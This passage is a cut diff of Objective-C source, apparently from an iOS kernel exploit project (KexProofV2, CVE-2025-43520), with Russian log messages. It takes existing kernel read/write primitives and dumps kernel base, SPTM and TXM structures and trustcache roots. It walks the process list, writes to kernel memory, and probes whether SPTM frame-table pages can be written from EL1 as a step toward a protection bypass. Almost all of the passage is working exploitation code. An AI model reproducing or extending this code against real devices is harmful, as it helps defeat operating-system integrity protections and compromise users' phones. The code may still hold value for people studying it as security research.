+        kpNote(r, [NSString stringWithFormat:@"  %-32@ %@", key, val]);
+    };
+
+    [r appendString:@"========================================\n"];
+    [r appendString:@"KexProofV2 — дамп ядра (CVE-2025-43520, ClearSword)\n"];
+    [r appendFormat:@"Дата: %@\nУстройство: %s · iOS %@ · Darwin %s · %s\n",
+        [iso stringFromDate:[NSDate date]], u.machine,
+        [UIDevice currentDevice].systemVersion, u.release, u.version];
+    [r appendString:@"========================================\n"];
+
+    // Self-test: read the kernel header magic and cpu_ttep through the raw
+    // primitive, so a broken read path is visible before anything else.
+    if (kconstant(base)) {
+        uint64_t magic = 0;
+        kreadbuf(kconstant(base), &magic, sizeof(magic));
+        kpNote(r, [NSString stringWithFormat:@"самотест чтения: u64 @ kernel base = 0x%016llx (ждём 0x0100000cfeedfacf)", magic]);
+        if (ksymbol(cpu_ttep)) {
+            uint64_t ttep = 0;
+            kreadbuf(ksymbol(cpu_ttep), &ttep, sizeof(ttep));
+            kpNote(r, [NSString stringWithFormat:@"самотест: cpu_ttep u64 = 0x%016llx (@ 0x%016llx)", ttep, ksymbol(cpu_ttep)]);
+        }
+        // For each target: u64 via the stock path vs the aligned-window path,
+        // plus the raw stock 32-byte window for context.
+        uint64_t targets[3] = {kconstant(base), 0, 0};
+        if (ksymbol(cpu_ttep)) targets[1] = ksymbol(cpu_ttep);
+        if (ksymbol(mach_kobj_count)) targets[2] = ksymbol(mach_kobj_count);
+        for (int t = 0; t < 3; ++t) {
+            if (!targets[t]) continue;
+            uint64_t stockValue = 0;
+            kreadbuf(targets[t], &stockValue, sizeof(stockValue));
+            uint64_t alignedValue = 0;
+            early_kreadbuf_aligned(targets[t], &alignedValue, sizeof(alignedValue));
+            uint8_t window[32];
+            memset(window, 0, sizeof(window));
+            kreadbuf(targets[t], window, sizeof(window));
+            NSMutableString *hex = [NSMutableString string];
+            for (int i = 0; i < 32; i += 8) {
+                uint64_t q = 0;
+                memcpy(&q, window + i, 8);
+                [hex appendFormat:@"%016llx ", (unsigned long long)q];
+            }
+            kpNote(r, [NSString stringWithFormat:@"@ 0x%016llx u64 stock=0x%016llx aligned=0x%016llx",
+                      targets[t],
+                      (unsigned long long)stockValue,
+                      (unsigned long long)alignedValue]);
+            kpNote(r, [NSString stringWithFormat:@"  окно (stock): %@", hex]);
+        }
+    }
+
+    section(@"Константы ядра");
+    kv(@"kernel base (static)", [NSString stringWithFormat:@"0x%016llx", kconstant(staticBase)]);
+    kv(@"kernel base (runtime)", [NSString stringWithFormat:@"0x%016llx", kconstant(base)]);
+    kv(@"kernel slide", [NSString stringWithFormat:@"0x%016llx", kconstant(slide)]);
+    kv(@"kernel_el", [NSString stringWithFormat:@"%llu", kconstant(kernel_el)]);
+    kv(@"pointer_mask", [NSString stringWithFormat:@"0x%016llx", kconstant(pointer_mask)]);
+    kv(@"gVirtBase", [NSString stringWithFormat:@"0x%016llx", kconstant(virtBase)]);
+    kv(@"gPhysBase", [NSString stringWithFormat:@"0x%016llx", kconstant(physBase)]);
+    kv(@"gPhysSize", [NSString stringWithFormat:@"0x%016llx", kconstant(physSize)]);
+    kv(@"cpu_ttep", [NSString stringWithFormat:@"0x%016llx", kconstant(cpuTTEP)]);
+    kv(@"vm real page size", [NSString stringWithFormat:@"0x%llx", vm_real_kernel_page_size]);
+    if (kconstant(sptmBase)) {
+        kv(@"sptm base", [NSString stringWithFormat:@"0x%016llx", kconstant(sptmBase)]);
+        kv(@"sptm slide", [NSString stringWithFormat:@"0x%016llx", kconstant(sptmSlide)]);
+    }
+    if (kconstant(txmBase)) {
+        kv(@"txm base", [NSString stringWithFormat:@"0x%016llx", kconstant(txmBase)]);
+        kv(@"txm slide", [NSString stringWithFormat:@"0x%016llx", kconstant(txmSlide)]);
+    }
+
+    section(@"Магия заголовка ядра (первые 64 байта по kernel base)");
+    if (kconstant(base)) {
+        uint8_t header[64];
+        if (kpRead(kconstant(base), header, sizeof(header), "kernel base", r)) {
+            NSMutableString *hex = [NSMutableString string];
+            kpAppendHexDump(hex, kconstant(base), header, sizeof(header));
+            [log append:hex];
+            [r appendString:hex];
+            uint64_t magic = 0;
+            memcpy(&magic, header, sizeof(magic));
+            kv(@"magic check", (magic == 0x0100000CFEEDFACFULL) ? @"OK (feedfacf, MH_MAGIC_64)" : @"НЕ СОВПАЛА");
+        }
+    }
+    else {
+        kpNote(r, @"  kernel base неизвестен — пропуск");
+    }
+
+    section(@"Глобальные переменные VM (адрес символа и значение)");
+    struct { const char *name; uint64_t symAddr; } vmSyms[] = {
+        { "gPhysBase",     ksymbol(gPhysBase) },
+        { "gVirtBase",     ksymbol(gVirtBase) },
+        { "cpu_ttep",      ksymbol(cpu_ttep) },
+        { "vm_first_phys", ksymbol(vm_first_phys) },
+        { "vm_last_phys",  ksymbol(vm_last_phys) },
+        { "pv_head_table", ksymbol(pv_head_table) },
+    };
+    for (size_t i = 0; i < sizeof(vmSyms) / sizeof(vmSyms[0]); i++) {
+        if (!vmSyms[i].symAddr) {
+            kpNote(r, [NSString stringWithFormat:@"  %-32s ключ не найден — пропуск", vmSyms[i].name]);
+            continue;
+        }
+        kpNote(r, [NSString stringWithFormat:@"  %s символ @ 0x%016llx", vmSyms[i].name, vmSyms[i].symAddr]);
+        uint64_t v = 0;
+        kpReadU64(vmSyms[i].name, vmSyms[i].symAddr, &v, r);
+    }
+
+    section(@"SPTMArgs (128 байт у символа, затем по указателю)");
+    if (ksymbol(SPTMArgs)) {
+        uint8_t buf[128];
+        if (kpRead(ksymbol(SPTMArgs), buf, sizeof(buf), "SPTMArgs", r)) {
+            NSMutableString *hex = [NSMutableString string];
+            kpAppendHexDump(hex, ksymbol(SPTMArgs), buf, sizeof(buf));
+            [log append:hex];
+            [r appendString:hex];
+
+            uint64_t args = 0;
+            memcpy(&args, buf, sizeof(args));
+            args = kp_untag_ptr(args);
+            kv(@"SPTMArgs ptr", [NSString stringWithFormat:@"0x%016llx", args]);
+            if (kpLooksLikeKernelPointer(args)) {
+                kpDumpRegion(r, "SPTMArgs target", args, 128);
+            }
+            else {
+                kpNote(r, @"  SPTMArgs target: некорректный указатель — пропуск");
+            }
+        }
+    }
+    else {
+        kpNote(r, @"  SPTMArgs: ключ не найден — пропуск");
+    }
+
+    section(@"libsptm_frame_type_params (256 байт)");
+    kpDumpRegion(r, "libsptm_frame_type_params", ksymbol(libsptm_frame_type_params), 256);
+
+    section(@"libsptm_frame_table (первые 256 байт)");
+    kpDumpRegion(r, "libsptm_frame_table", ksymbol(libsptm_frame_table), 256);
+
+    section(@"n_papt_ranges_compressed (sptm-слайд)");
+    if (ksymbol_sptm(n_papt_ranges_compressed)) {
+        kpNote(r, [NSString stringWithFormat:@"  n_papt_ranges_compressed символ @ 0x%016llx", ksymbol_sptm(n_papt_ranges_compressed)]);
+        uint8_t buf[64];
+        if (kpRead(ksymbol_sptm(n_papt_ranges_compressed), buf, sizeof(buf), "n_papt_ranges_compressed", r)) {
+            uint32_t n = 0;
+            memcpy(&n, buf, sizeof(n));
+            kv(@"n_papt_ranges_compressed", [NSString stringWithFormat:@"%u (0x%x)", n, n]);
+            NSMutableString *hex = [NSMutableString string];
+            kpAppendHexDump(hex, ksymbol_sptm(n_papt_ranges_compressed), buf, sizeof(buf));
+            [log append:hex];
+            [r appendString:hex];
+        }
+    }
+    else {
+        kpNote(r, @"  n_papt_ranges_compressed: ключ не найден (нет SPTM-слайда?) — пропуск");
+    }
+
+    section(@"libsptm_papt_ranges (128 байт) + таблица по указателю");
+    if (ksymbol(libsptm_papt_ranges)) {
+        uint8_t buf[128];
+        if (kpRead(ksymbol(libsptm_papt_ranges), buf, sizeof(buf), "libsptm_papt_ranges", r)) {
+            NSMutableString *hex = [NSMutableString string];
+            kpAppendHexDump(hex, ksymbol(libsptm_papt_ranges), buf, sizeof(buf));
+            [log append:hex];
+            [r appendString:hex];
+
+            uint64_t table = 0;
+            memcpy(&table, buf, sizeof(table));
+            table = kp_untag_ptr(table);
+            kv(@"libsptm_papt_ranges ptr", [NSString stringWithFormat:@"0x%016llx", table]);
+            if (kpLooksLikeKernelPointer(table)) {
+                kpDumpRegion(r, "papt table", table, 128);
+            }
+            else {
+                kpNote(r, @"  papt table: некорректный указатель — пропуск");
+            }
+        }
+    }
+    else {
+        kpNote(r, @"  libsptm_papt_ranges: ключ не найден — пропуск");
+    }
+
+    section(@"papt_ranges_compressed (sptm-слайд, 128 байт)");
+    kpDumpRegion(r, "papt_ranges_compressed", ksymbol_sptm(papt_ranges_compressed), 128);
+
+    section(@"txm_trustcache_root (txm-слайд, 64 байта + по указателям)");
+    if (ksymbol_txm(txm_trustcache_root)) {
+        uint8_t buf[64];
+        if (kpRead(ksymbol_txm(txm_trustcache_root), buf, sizeof(buf), "txm_trustcache_root", r)) {
+            NSMutableString *hex = [NSMutableString string];
+            kpAppendHexDump(hex, ksymbol_txm(txm_trustcache_root), buf, sizeof(buf));
+            [log append:hex];
+            [r appendString:hex];
+
+            uint64_t ptr0 = 0, rootTc = 0;
+            memcpy(&ptr0, buf, sizeof(ptr0));
+            memcpy(&rootTc, buf + 0x20, sizeof(rootTc));
+            ptr0 = kp_untag_ptr(ptr0);
+            rootTc = kp_untag_ptr(rootTc);
+
+            kv(@"*(txm_trustcache_root)", [NSString stringWithFormat:@"0x%016llx", ptr0]);
+            if (kpLooksLikeKernelPointer(ptr0)) {
+                kpDumpRegion(r, "txm_trustcache_root ptr", ptr0, 64);
+            }
+            else {
+                kpNote(r, @"  *txm_trustcache_root: некорректный указатель — пропуск");
+            }
+
+            // Dopamine's trustcache.c: active root trustcache lives at +0x20
+            kv(@"*(txm_trustcache_root+0x20)", [NSString stringWithFormat:@"0x%016llx", rootTc]);
+            if (kpLooksLikeKernelPointer(rootTc)) {
+                kpDumpRegion(r, "root trustcache", rootTc, 64);
+            }
+            else {
+                kpNote(r, @"  *(txm_trustcache_root+0x20): некорректный указатель — пропуск");
+            }
+        }
+    }
+    else {
+        kpNote(r, @"  txm_trustcache_root: ключ не найден (нет TXM-слайда?) — пропуск");
+    }
+
+    section(@"allproc (EXP-01: две соседние головы, калибровка по kernel_task)");
+    {
+        uint64_t head = [self resolveAllprocHeadWithLog:r];
+        if (!head) {
+            kpNote(r, @"  allproc недоступен — см. диагностику выше");
+        }
+        else {
+            // Walk and print the first four procs of the fixed chain.
+            uint64_t node = head, prev = 0;
+            for (int i = 0; i < 4 && kpLooksLikeKernelPointer(node) && node != prev; i++) {
+                kpDumpProc(r, i == 0 ? "proc[0] (kernel_task)" : "proc[next]", node, gCommOff);
+                uint64_t nextRaw = 0;
+                if (!kpRead(node + koffsetof(proc, list_next), &nextRaw, sizeof(nextRaw), "p_list.le_next", r)) break;
+                prev = node;
+                node = kp_untag_ptr(nextRaw);
+            }
+        }
+    }
+
+    section(@"Конец дампа");
+    flush();
+    return r;
+}
+
++ (NSString *)sptmWriteTestReport
+{
+    NSMutableString *r = [NSMutableString string];
+    [r appendString:@"\n--- Эксперимент A0: безопасное доказательство kwrite ---\n"];
+    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
+        [r appendString:@"KRW-примитивы не живы — сначала эксплойт.\n"];
+        return r;
+    }
+    uint64_t kobjCount = ksymbol(mach_kobj_count);
+    if (!kobjCount) {
+        [r appendString:@"mach_kobj_count нет в словаре оффсетов — SKIP\n"];
+        return r;
+    }
+    kpNote(r, [NSString stringWithFormat:@"mach_kobj_count @ 0x%llx", kobjCount]);
+
+    // Same-value rewrite + readback: harmless on a live stats counter, and it
+    // proves the write path end-to-end without touching anything SPTM-owned.
+    uint64_t original = 0;
+    kreadbuf(kobjCount, &original, sizeof(original));
+    kpNote(r, [NSString stringWithFormat:@"прочитано до записи: 0x%llx",
+              (unsigned long long)original]);
+
+    uint64_t toggled = original ^ 0x1; // flip the lowest bit only
+    kwritebuf(kobjCount, &toggled, sizeof(toggled));
+    uint64_t afterWrite = 0;
+    kreadbuf(kobjCount, &afterWrite, sizeof(afterWrite));
+    kpNote(r, [NSString stringWithFormat:@"прочитано после записи: 0x%llx (ждём 0x%llx)",
+              (unsigned long long)afterWrite, (unsigned long long)toggled]);
+
+    // Restore the original value.
+    kwritebuf(kobjCount, &original, sizeof(original));
+    uint64_t restored = 0;
+    kreadbuf(kobjCount, &restored, sizeof(restored));
+
+    BOOL writeWorks = (afterWrite == toggled);
+    if (writeWorks) {
+        [r appendString:@"\n=== A0 PASS: kwrite пишет и читается обратно ===\n"];
+        [r appendString:[NSString stringWithFormat:@"восстановление: %s (0x%llx)\n",
+            restored == original ? "OK" : "СЧЁТЧИК ШАГНУЛ ПОКА ПИСАЛИ — это нормально",
+            (unsigned long long)restored]];
+        [r appendString:@"Запись работает. (A1) frame_table — отдельная кнопка, МОЖЕТ ПАНИКОВАТЬ (уже паниковала один раз — это и есть ответ, что EL1 туда не пишет без SPTM-байпаса).\n"];
+    } else {
+        [r appendString:@"\n=== A0 FAIL: записи не прилипли — kwrite не работает даже на обычной глобали ===\n"];
+        [r appendString:@"Тогда и frame_table не напишется. Копаем путь записи (setsockopt ICMP6_FILTER).\n"];
+    }
+    return r;
+}
+
++ (NSString *)sptmFrameTableWriteTestReport
+{
+    NSMutableString *r = [NSMutableString string];
+    [r appendString:@"\n--- Эксперимент A1: запись в страницу SPTM frame_table (МОЖЕТ ПАНИКОВАТЬ!) ---\n"];
+    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
+        [r appendString:@"KRW-примитивы не живы — сначала эксплойт.\n"];
+        return r;
+    }
+    uint64_t table = ksymbol(libsptm_frame_table);
+    if (!table) {
+        [r appendString:@"libsptm_frame_table нет в словаре оффсетов — SKIP\n"];
+        return r;
+    }
+    kpNote(r, [NSString stringWithFormat:@"frame_table @ 0x%llx", table]);
+
+    // Scan the page for a zero qword (free entry); never touch live entries.
+    // 1.8.0: reads go through kpRead — the EL2/unmapped gates apply here too;
+    // a frame_table VA that is not backed must not panic the win.
+    const size_t pageSize = 0x4000;
+    uint64_t zeroSlot = 0;
+    for (uint64_t off = 0; off < pageSize; off += 0x100) {
+        uint8_t chunk[0x100];
+        memset(chunk, 0, sizeof(chunk));
+        if (!kpRead(table + off, chunk, sizeof(chunk), "frame_table scan", r)) return r;
+        for (size_t i = 0; i + 8 <= sizeof(chunk); i += 8) {
+            uint64_t value = 0;
+            memcpy(&value, chunk + i, sizeof(value));
+            if (value == 0) {
+                zeroSlot = table + off + i;
+                break;
+            }
+        }
+        if (zeroSlot) break;
+    }
+    if (!zeroSlot) {
+        [r appendString:@"Свободных (нулевых) записей на странице нет — SKIP (живые записи не трогаем)\n"];
+        return r;
+    }
+    kpNote(r, [NSString stringWithFormat:@"свободный слот @ 0x%llx", zeroSlot]);
+
+    static const uint64_t marker = 0x4b50575249544531ULL; // "KPWRITE1"
+    kwritebuf(zeroSlot, &marker, sizeof(marker));
+    uint64_t readback = 0;
+    kpRead(zeroSlot, &readback, sizeof(readback), "A1 readback", r);
+    BOOL stuck = (readback == marker);
+    kpNote(r, [NSString stringWithFormat:@"записал 0x%llx, прочитал обратно 0x%llx",
+              (unsigned long long)marker, (unsigned long long)readback]);
+
+    // Always restore zeros, whatever happened above.
+    uint64_t zero = 0;
+    kwritebuf(zeroSlot, &zero, sizeof(zero));
+    uint64_t verify = 0;
+    kpRead(zeroSlot, &verify, sizeof(verify), "A1 restore-verify", r);
+
+    if (stuck) {
+        [r appendString:@"\n=== PASS: страница frame_table ПИШЕТСЯ из EL1 ===\n"];
+        [r appendString:@"SPTM-состояние можно менять напрямую — типы/параметры фреймов на редактирование.\n"];
+        [r appendString:@"Восстановление нулей: "];
+        [r appendString:verify == 0 ? @"OK\n" : [NSString stringWithFormat:@"ПРОВАЛ (осталось 0x%llx)\n", (unsigned long long)verify]];
+    } else {
+        [r appendString:@"\n=== FAIL: запись не прилипла — страницы SPTM из EL1 не пишутся ===\n"];
+        [r appendString:@"Следующие кандидаты: (B) валидация аргументов эндпоинтов, (C) гонка nest/unnest, (D) TXM-стек 0x2a.\n"];
+    }
+    return r;
+}
+
+#pragma mark - EXP-02: SPTM/TXM bases (DEBG fast path + pointer-vote)
+
+// The libsptm kernel block (static 0x7b37748) holds tagged pointers to the
+// shared runtime pages. Return all pointer-looking stripped values (cached).
+static NSArray<NSNumber *> *gBlockPointees = nil;
++ (NSArray<NSNumber *> *)libsptmBlockPointeesWithLog:(NSMutableString *)r
+{
+    if (gBlockPointees) return gBlockPointees;
+    NSMutableArray<NSNumber *> *out = [NSMutableArray array];
+    if (!ksymbol(libsptm_n_papt_ranges)) return out;
+    uint64_t blockBase = ksymbol(libsptm_n_papt_ranges) - 8; // static 0x7b37748
+    uint8_t block[0xB0];
+    memset(block, 0, sizeof(block));
+    if (!kpRead(blockBase, block, sizeof(block), "libsptm block", r)) return out;
+    [r appendString:@"  libsptm block pointees (stripped):\n"];
+    for (int i = 0; i < 0xB0 / 8; i++) {
+        uint64_t raw = 0;
+        memcpy(&raw, block + i * 8, 8);
+        uint64_t va = kp_untag_ptr(raw);
+        if (kpLooksLikeKernelPointer(va)) {
+            [out addObject:@(va)];
+            [r appendFormat:@"    +0x%02x → 0x%016llx\n", i * 8, (unsigned long long)va];
+        }
+    }
+    gBlockPointees = out;
+    return out;
+}
+
+// Derive SPTM/TXM runtime slides by voting: scan the shared pages for qwords
+// that strip into the SPTM/TXM image ranges, and for each compute candidate
+// slides against known static offsets (validator funcs / TXM stubs from the
+// interface map). The slide that explains the most pointers wins.
++ (BOOL)deriveSptmTxmSlidesByVote:(NSMutableString *)r
+{
+    if (!kconstant(staticSptmBase)) {
+        kpNote(r, @"  vote: нет staticSptmBase — пропуск");
+        return NO;
+    }
+    // Known static offsets inside the SPTM image (interface map §6.2: frame
+    // type descriptor validators/hooks) and TXM image (§7: dispatcher, branch
+    // table, svc stubs, trustcache root).
+    static const uint64_t sptmKnown[] = {
+        0xfffffff0270b9620ULL, 0xfffffff0270b9618ULL, 0xfffffff0270b8ba0ULL,
+        0xfffffff0270b8f2cULL, 0xfffffff0270b8a4cULL, 0xfffffff0270b8b30ULL,
+        0xfffffff0270b87a0ULL, 0xfffffff0270b86bcULL, 0xfffffff0270b8c70ULL,
+        0xfffffff0270b8578ULL, 0xfffffff0270b9628ULL, 0xfffffff0270b9604ULL,
+        0xfffffff0270b89e0ULL,
+    };
+    static const uint64_t txmKnown[] = {
+        0xfffffff017026d34ULL, 0xfffffff01702718cULL,
+        0xfffffff01706005cULL, 0xfffffff017060068ULL, 0xfffffff017010590ULL,
+    };
+    uint64_t sptmLo = kconstant(staticSptmBase), sptmHi = sptmLo + 0xF4000;
+    uint64_t txmLo = kconstant(staticTxmBase), txmHi = txmLo + 0x64000;
+
+    NSMutableDictionary<NSNumber *, NSNumber *> *sptmVotes = [NSMutableDictionary dictionary];
+    NSMutableDictionary<NSNumber *, NSNumber *> *txmVotes = [NSMutableDictionary dictionary];
+
+    NSArray<NSNumber *> *pointees = [self libsptmBlockPointeesWithLog:r];
+    for (NSNumber *pv in pointees) {
+        uint64_t pageVA = pv.unsignedLongLongValue;
+        // scan the page in 0x400 windows
+        for (uint64_t off = 0; off < 0x4000; off += 0x400) {
+            uint8_t win[0x400];
+            memset(win, 0, sizeof(win));
+            if (!kpRead(pageVA + off, win, sizeof(win), "vote scan", r)) break;
+            for (uint32_t q = 0; q + 8 <= sizeof(win); q += 8) {
+                uint64_t raw = 0;
+                memcpy(&raw, win + q, 8);
+                uint64_t va = kp_untag_ptr(raw);
+                if (va >= sptmLo && va < sptmHi) {
+                    for (size_t k = 0; k < sizeof(sptmKnown) / sizeof(sptmKnown[0]); k++) {
+                        int64_t cand = (int64_t)(va - sptmKnown[k]);
+                        if ((cand & 0x3fff) == 0 && llabs(cand) < 0x40000000) {
+                            NSNumber *key = @(cand);
+                            sptmVotes[key] = @(sptmVotes[key].intValue + 1);
+                        }
+                    }
+                }
+                if (kconstant(staticTxmBase) && va >= txmLo && va < txmHi) {
+                    for (size_t k = 0; k < sizeof(txmKnown) / sizeof(txmKnown[0]); k++) {
+                        int64_t cand = (int64_t)(va - txmKnown[k]);
+                        if ((cand & 0x3fff) == 0 && llabs(cand) < 0x40000000) {
+                            NSNumber *key = @(cand);
+                            txmVotes[key] = @(txmVotes[key].intValue + 1);
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    BOOL okSptm = NO, okTxm = NO;
+    if (sptmVotes.count) {
+        NSArray<NSNumber *> *sorted = [sptmVotes.allKeys sortedArrayUsingComparator:^NSComparisonResult(NSNumber *a, NSNumber *b) {
+            return [@(sptmVotes[b].intValue) compare:@(sptmVotes[a].intValue)];
+        }];
+        for (NSNumber *cand in sorted) {
+            if ([cand isEqual:sorted.firstObject] || sptmVotes[cand].intValue >= 2) {
+                kpNote(r, [NSString stringWithFormat:@"  vote SPTM: slide=%s0x%llx голосов=%d",
+                          cand.longLongValue < 0 ? "-" : "", (unsigned long long)llabs(cand.longLongValue), sptmVotes[cand].intValue]);
+            }
+        }
+        NSNumber *best = sorted.firstObject;
+        if (sptmVotes[best].intValue >= 2) {
+            int64_t slide = best.longLongValue;
+            gSystemInfo.kernelConstant.sptmSlide = (uint64_t)slide;
+            gSystemInfo.kernelConstant.sptmBase = kconstant(staticSptmBase) + slide;
+            kpNote(r, [NSString stringWithFormat:@"  EXP-02: sptmSlide=%s0x%llx (голосов=%d), sptmBase=0x%016llx",
+                      slide < 0 ? "-" : "", (unsigned long long)llabs(slide), sptmVotes[best].intValue,
+                      (unsigned long long)kconstant(sptmBase)]);
+            okSptm = YES;
+        }
+    }
+    if (txmVotes.count) {
+        NSArray<NSNumber *> *sorted = [txmVotes.allKeys sortedArrayUsingComparator:^NSComparisonResult(NSNumber *a, NSNumber *b) {
+            return [@(txmVotes[b].intValue) compare:@(txmVotes[a].intValue)];
+        }];
+        NSNumber *best = sorted.firstObject;
+        kpNote(r, [NSString stringWithFormat:@"  vote TXM: slide=%s0x%llx голосов=%d (слабо)",
+                  best.longLongValue < 0 ? "-" : "", (unsigned long long)llabs(best.longLongValue), txmVotes[best].intValue]);
+        int64_t slide = best.longLongValue;
+        gSystemInfo.kernelConstant.txmSlide = (uint64_t)slide;
+        gSystemInfo.kernelConstant.txmBase = kconstant(staticTxmBase) + slide;
+        kpNote(r, [NSString stringWithFormat:@"  EXP-02: txmSlide=%s0x%llx, txmBase=0x%016llx",
+                  slide < 0 ? "-" : "", (unsigned long long)llabs(slide), (unsigned long long)kconstant(txmBase)]);
+        okTxm = YES;
+    }
+    if (!okSptm) kpNote(r, @"  EXP-02: SPTM-слайд не вычислен (нет голосов) — sptmBase/slide остаются 0");
+    if (!okTxm) kpNote(r, @"  EXP-02: TXM-слайд не вычислен (нет голосов) — txmBase/slide остаются 0");
+    return okSptm || okTxm;
+}
+
++ (BOOL)harvestSptmTxmBasesWithLog:(NSMutableString *)r
+{
+    if (kconstant(sptmBase) && kconstant(txmBase)) {
+        return YES; // already harvested
+    }
+    uint64_t sym = ksymbol(SPTMArgs);
+    if (!sym) {
+        kpNote(r, @"  SPTMArgs: ключ не найден — harvest невозможен");
+        return NO;
+    }
+
+    // Fast path: DEBG scan of the 16 SPTMArgs pointees. Field result on 18.6:
+    // all point at SPTM-call stub pages (bti c), no DEBG — kept anyway.
+    uint8_t argsBuf[128];
+    memset(argsBuf, 0, sizeof(argsBuf));
+    if (kpRead(sym, argsBuf, sizeof(argsBuf), "SPTMArgs", r)) {
+        BOOL debgFound = NO;
+        for (int i = 0; i < 16; i++) {
+            uint64_t raw = 0;
+            memcpy(&raw, argsBuf + i * 8, sizeof(raw));
+            if (!raw) continue;
+            uint64_t ptr = kp_untag_ptr(raw);
+            if (!kpLooksLikeKernelPointer(ptr)) continue;
+            uint8_t page[0x100];
+            memset(page, 0, sizeof(page));
+            if (!kpRead(ptr, page, sizeof(page), "SPTMArgs pointee", r)) continue;
+            uint32_t magic = 0;
+            memcpy(&magic, page, sizeof(magic));
+            if (magic != 0x47424544) continue; // 'DEBG'
+            uint64_t sptmB = 0, txmB = 0;
+            memcpy(&sptmB, page + 0x10, sizeof(sptmB));
+            memcpy(&txmB, page + 0x20, sizeof(txmB));
+            kpNote(r, [NSString stringWithFormat:@"  EXP-02: DEBG найден: SPTMArgs[%d] → %#llx; sptm base=0x%016llx txm base=0x%016llx",
+                      i, ptr, (unsigned long long)sptmB, (unsigned long long)txmB]);
+            if (kpLooksLikeKernelPointer(sptmB) && kconstant(staticSptmBase)) {
+                gSystemInfo.kernelConstant.sptmBase = sptmB;
+                gSystemInfo.kernelConstant.sptmSlide = sptmB - kconstant(staticSptmBase);
+            }
+            if (kpLooksLikeKernelPointer(txmB) && kconstant(staticTxmBase)) {
+                gSystemInfo.kernelConstant.txmBase = txmB;
+                gSystemInfo.kernelConstant.txmSlide = txmB - kconstant(staticTxmBase);
+            }
+            debgFound = YES;
+            break;
+        }
+        if (debgFound) return YES;
+        kpNote(r, @"  EXP-02: DEBG не найден (16 pointees — стабы), перехожу к pointer-vote");
+    }
+
+    // 1.8.3: the pointer-vote walk is DEAD. It read hundreds of pointees from
+    // the libsptm block, and some resolve (kvtophys != 0) but panic the EL1
+    // read anyway — SPTM-owned pages (the 20:58 post-win panic, 19s after a
+    // clean win). The vote is unnecessary: every panic header this device has
+    // produced shows a fixed layout — SPTM = kernel base - 0x20000000, TXM =
+    // kernel base - 0x10000000. Hardcode it; zero reads.
+    if (kconstant(base) && kconstant(staticSptmBase)) {
+        uint64_t sptmB = kconstant(base) - 0x20000000ULL;
+        gSystemInfo.kernelConstant.sptmBase = sptmB;
+        gSystemInfo.kernelConstant.sptmSlide = sptmB - kconstant(staticSptmBase);
+        kpNote(r, [NSString stringWithFormat:@"  EXP-02 (формула, без голосования): sptmBase=0x%016llx sptmSlide=0x%llx",
+                  (unsigned long long)sptmB, (unsigned long long)gSystemInfo.kernelConstant.sptmSlide]);
+    }
+    if (kconstant(base) && kconstant(staticTxmBase)) {
+        uint64_t txmB = kconstant(base) - 0x10000000ULL;
+        gSystemInfo.kernelConstant.txmBase = txmB;
+        gSystemInfo.kernelConstant.txmSlide = txmB - kconstant(staticTxmBase);
+        kpNote(r, [NSString stringWithFormat:@"  EXP-02 (формула): txmBase=0x%016llx txmSlide=0x%llx",
+                  (unsigned long long)txmB, (unsigned long long)gSystemInfo.kernelConstant.txmSlide]);
+    }
+    return (kconstant(staticSptmBase) && gSystemInfo.kernelConstant.sptmBase) ||
+           (kconstant(staticTxmBase) && gSystemInfo.kernelConstant.txmBase);
+}
+
+#pragma mark - EXP-03: frame-table / descriptor / PAPT survey
+
+static uint64_t gFrameTableVA = 0;
+static BOOL gHeapTypeKnown = NO;
+static uint8_t gHeapFrameType = 0;
+
+// Managed-DRAM predicate on this device: physBase is 0x1_00xxxxxx (T8122),
+// so the old ">16 GiB" clamp rejected EVERY real PA. Frame type is only
+// meaningful inside [physBase, physBase+physSize).
+static BOOL kpPAIsManaged(uint64_t pa)
+{
+    return kconstant(physBase) && pa >= kconstant(physBase) &&
+           pa < kconstant(physBase) + kconstant(physSize);
+}
+
++ (uint64_t)frameTableVAWithLog:(NSMutableString *)r
+{
+    if (gFrameTableVA) return gFrameTableVA;
+    if (!ksymbol(libsptm_frame_table)) {
+        kpNote(r, @"  libsptm_frame_table: ключ не найден — пропуск");
+        return 0;
+    }
+    uint64_t raw = 0;
+    if (!kpRead(ksymbol(libsptm_frame_table), &raw, sizeof(raw), "libsptm_frame_table slot", r)) return 0;
+    uint64_t va = kp_untag_ptr(raw);
+    kpNote(r, [NSString stringWithFormat:@"  frame table: raw=0x%016llx → VA 0x%016llx",
+              (unsigned long long)raw, (unsigned long long)va]);
+    if (!kpLooksLikeKernelPointer(va)) {
+        kpNote(r, @"  frame table VA неправдоподобен — пропуск");
+        return 0;
+    }
+    gFrameTableVA = va;
+    kpSetFrameTableVA(va);   // 1.9.177: frame-type гейт для walker'а (translation.c)
+    kpSetFrameTypeLogger(kpFrameTypeLogCb);   // 1.9.178b: census типов в syslog
+    return va;
+}
+
+// Frame-type byte for a physical address: fte = table + (pa>>14)*16, type at
+// byte +2 (spec §6.1). -1 when unavailable / implausible. Silent variant for
+// sweeps (the table page is proven EL1-readable before any sweep starts).
+static int kpFrameTypeOfPALogged(uint64_t tableVA, uint64_t pa, NSMutableString *r)
+{
+    if (!tableVA || pa == 0 || !kpPAIsManaged(pa)) return -1;
+    // 1.9.10: index by (pa - physBase)>>14, NOT pa>>14 — absolute-pfn indexing
+    // overshoots the (physSize/16K)-entry table on this 4GB+ device and read
+    // garbage (the "level=112" FTE). The alt-index probe read back a sane
+    // leaf FTE (type 0x14, level 3).
+    if (kconstant(physBase) && pa < kconstant(physBase)) return -1;
+    uint64_t fte = tableVA + ((pa - kconstant(physBase)) >> 14) * 16;
+    uint8_t entry[16];
+    memset(entry, 0, sizeof(entry));
+    if (!kpRead(fte, entry, sizeof(entry), "frame-table entry", r)) return -1;
+    return entry[2];
+}
+
+static int kpFrameTypeOfPAQuiet(uint64_t tableVA, uint64_t pa)
+{
+    if (!tableVA || pa == 0 || !kpPAIsManaged(pa)) return -1;
+    if (kconstant(physBase) && pa < kconstant(physBase)) return -1;
+    uint64_t fte = tableVA + ((pa - kconstant(physBase)) >> 14) * 16;
+    uint8_t entry[16];
+    memset(entry, 0, sizeof(entry));
+    kreadbuf(fte, entry, sizeof(entry));
+    return entry[2];
+}
+
+// §6.3: compressed PAPT range = 24 B {paddr_start, va_base, page_count, pad}.
+static BOOL kpPaptEntryPlausible(const uint8_t *e)
+{
+    uint64_t paddr = 0, vabase = 0;
+    uint32_t count = 0;
+    memcpy(&paddr, e, 8);
+    memcpy(&vabase, e + 8, 8);
+    memcpy(&count, e + 16, 4);
